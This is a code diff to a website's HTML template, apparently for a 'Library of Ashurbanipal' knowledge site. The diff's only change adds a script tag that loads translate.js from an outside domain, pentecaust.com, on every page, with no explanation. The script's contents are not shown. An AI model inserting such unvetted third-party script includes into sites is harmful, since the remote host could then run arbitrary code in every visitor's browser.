@@ -203,6 +203,7 @@ ${ld ? `<script type="application/ld+json">${ld}</script>` : ''}${THEME_BOOT}${S
 ${inner}
 <footer><div class=fnav><a href="/">Library</a><a href="/categories">Contents</a><a href="/search">Search</a><a href="/about">About</a><a href="https://witness.melek.salon">Witness School</a></div>
 The Library of Ashurbanipal — synthesized from the VKFRI knowledge base, grounded in cited sources and audited by a fact-checker. Claims attributed to VKFRI are the Institute's own; established science is marked as such.</footer>
+<script src="https://pentecaust.com/translate.js" defer></script>
 </body></html>`;
 }
 
